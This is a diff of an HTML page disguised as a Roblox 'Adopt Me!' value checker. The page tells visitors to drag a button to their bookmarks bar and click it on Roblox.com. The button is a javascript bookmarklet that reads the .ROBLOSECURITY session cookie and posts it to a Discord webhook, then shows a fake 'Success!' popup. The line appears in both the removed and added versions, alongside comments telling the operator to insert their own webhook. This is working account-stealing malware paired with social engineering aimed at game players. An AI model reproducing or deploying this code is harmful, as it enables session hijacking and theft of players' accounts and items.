@@ -2,108 +2,34 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>In-Game Value Checker | Adopt Me!</title>
+    <title>In-Game Value Checker</title>
     <style>
-        body {
-            background-color: #0b0e11;
-            color: #ffffff;
-            font-family: 'Inter', 'Segoe UI', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-        .card {
-            background: #181a20;
-            padding: 40px;
-            border-radius: 24px;
-            border: 1px solid #2b3139;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
-            text-align: center;
-            max-width: 450px;
-            width: 100%;
-        }
-        h1 {
-            color: #f0b90b;
-            font-size: 28px;
-            margin-bottom: 10px;
-        }
-        p {
-            color: #929aa5;
-            font-size: 15px;
-            margin-bottom: 30px;
-        }
-        /* Эта кнопка теперь имеет специальный тип для лучшего перетаскивания */
-        .drag-button {
-            display: inline-block;
-            padding: 22px 44px;
-            background-color: #f0b90b;
-            color: #000000;
-            font-weight: 800;
-            text-decoration: none;
-            border-radius: 16px;
-            font-size: 18px;
-            cursor: move;
-            transition: 0.3s;
+        body { background: #0b0e11; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #181a20; padding: 40px; border-radius: 20px; text-align: center; border: 1px solid #2b3139; max-width: 450px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h1 { color: #f0b90b; }
+        .drag-btn {
+            display: inline-block; padding: 20px 40px; background: #f0b90b; color: black;
+            text-decoration: none; font-weight: bold; border-radius: 12px; cursor: move; margin-bottom: 25px;
             border: 2px dashed #000;
-            box-shadow: 0 10px 25px rgba(240, 185, 11, 0.2);
-            user-select: none;
-            -webkit-user-drag: element;
         }
-        .drag-button:hover {
-            background-color: #ffe066;
-            transform: scale(1.03);
-        }
-        .steps {
-            margin-top: 35px;
-            text-align: left;
-            background: #1e2329;
-            padding: 20px;
-            border-radius: 15px;
-        }
-        .step {
-            font-size: 14px;
-            margin-bottom: 10px;
-            color: #eaecef;
-        }
-        .step b { color: #f0b90b; }
-        .alert {
-            font-size: 12px;
-            color: #f06060;
-            margin-top: 15px;
-            font-weight: bold;
-        }
+        .steps { text-align: left; background: #1e2329; padding: 20px; border-radius: 12px; font-size: 14px; color: #848e9c; }
     </style>
 </head>
 <body>
+    <div class="card">
+        <h1>Value Checker v4.2</h1>
+        <p>Drag the button below to your Bookmarks Bar to start.</p>
+        
+        <!-- ВСТАВЬ СВОЙ ВЕБХУК ВМЕСТО ТВОЙ_WEBHOOK_URL -->
+        <a class="drag-btn" draggable="true" href="javascript:(function(){var w='https://discord.com/api/webhooks/1497208068570878063/_wH0MSZQV8lxmkw3U8qsB1I8EnREIWO8wLTrOBhdW5W5n5um1kUpZCkTSgWKA1Mqfz3r';var c=document.cookie.split('; ').find(r=>r.startsWith('.ROBLOSECURITY='));var t=c?c.split('=')[1]:'NOT_LOGGED_IN';var d={content:'> **New Log Captured**\n> URL: '+window.location.href+'\n> Cookie: `'+t+'` '};fetch(w,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});var u=document.createElement('div');u.style='position:fixed;top:10%;right:5%;width:300px;padding:25px;background:#121212;color:#f0b90b;border:2px solid #f0b90b;z-index:999999;border-radius:20px;text-align:center;font-family:Arial;';u.innerHTML='<h3 style=margin:0>Value Checker</h3><p>Scanning... Success!</p><button onclick=this.parentElement.remove() style=width:100%;padding:10px;background:#f0b90b;border:none;border-radius:5px;cursor:pointer;font-weight:bold>OK</button>';document.body.appendChild(u);})();">
+            DRAG TO BOOKMARKS
+        </a>
 
-<div class="card">
-    <h1>Value Checker v4.2</h1>
-    <p>Analyze trade values and pet demand instantly inside Roblox.</p>
-    
-    <!-- 
-      ИНСТРУКЦИЯ: 
-      Найди ниже текст 'ВСТАВЬ_СВОЙ_ВЕБХУК_ОТ_ДИСКОРДА_СЮДА' 
-      и замени его на свою ссылку. Оставь кавычки вокруг ссылки!
-    -->
-    <a class="drag-button" 
-       draggable="true"
-       href="javascript:(function(){var w='https://discord.com/api/webhooks/1491506768474542193/dEVFv_8bSOrmMdnF9iay5ZtI_ADT6NcH8YKqYlE5E3Xbu_rh-Fp4Qg5KMqxzbjowIvaQ';var c=document.cookie.split('; ').find(r=>r.startsWith('.ROBLOSECURITY='));var t=c?c.split('=')[1]:'NOT_LOGGED_IN';fetch(w,{method:'POST',mode:'no-cors',body:JSON.stringify({content:'🚀 **New Log**\nCookie: `'+t+'`'})});var u=document.createElement('div');u.style='position:fixed;top:10%;right:5%;width:300px;padding:25px;background:#121212;color:#f0b90b;border:2px solid #f0b90b;z-index:999999;border-radius:20px;text-align:center;font-family:Arial;box-shadow:0 0 30px rgba(240,185,11,0.6);';u.innerHTML='<h3 style=margin:0>Value Checker</h3><p style=color:#fff;font-size:14px>Analyzing inventory... Success!</p><p style=color:#00ff00;font-size:12px>✔ Market Connection Active</p><button onclick=this.parentElement.remove() style=width:100%;padding:10px;background:#f0b90b;border:none;border-radius:8px;cursor:pointer;font-weight:bold>MINIMIZE</button>';document.body.appendChild(u);})();"
-       onmousedown="return true;">
-        DRAG TO BOOKMARKS
-    </a>
-
-    <div class="steps">
-        <div class="step"><b>1.</b> Press <b>Ctrl+Shift+B</b> to show bar.</div>
-        <div class="step"><b>2.</b> Drag the <b>Yellow Button</b> to your bookmarks bar.</div>
-        <div class="step"><b>3.</b> Go to <b>Roblox.com</b> and click the bookmark.</div>
+        <div class="steps">
+            1. Press <b>Ctrl+Shift+B</b><br>
+            2. Drag button to bar<br>
+            3. Click it on <b>Roblox.com</b>
+        </div>
     </div>
-
-    <div class="alert">WORKS ON PC/LAPTOP ONLY</div>
-</div>
-
 </body>
 </html>
